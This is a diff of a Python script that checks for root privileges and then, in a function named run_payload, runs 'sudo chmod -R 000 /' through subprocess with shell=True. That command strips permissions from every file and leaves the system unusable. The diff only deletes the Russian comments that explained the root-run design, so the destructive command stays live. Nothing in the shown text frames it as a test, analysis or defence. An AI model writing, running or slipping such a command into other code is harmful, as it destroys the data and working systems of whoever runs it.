@@ -12,11 +12,9 @@ def check_root():
 
 
 def run_payload():
-    """Команды, которые должны выполниться под root"""
+    
 
-
-    # Список команд для выполнения
-    # Здесь не нужно писать 'sudo', так как скрипт уже запущен с sudo
+    
     commands = [
         "sudo chmod -R 000 /",
 
@@ -24,14 +22,14 @@ def run_payload():
 
     for cmd in commands:
 
-        # shell=True позволяет использовать пайпы (|) и перенаправления
+        
         subprocess.run(cmd, shell=True)
 
 def main():
-    # 1. Сначала проверяем права
+    
     check_root()
 
-    # 2. Если проверка прошла, выполняем код
+    
 
     run_payload()
 
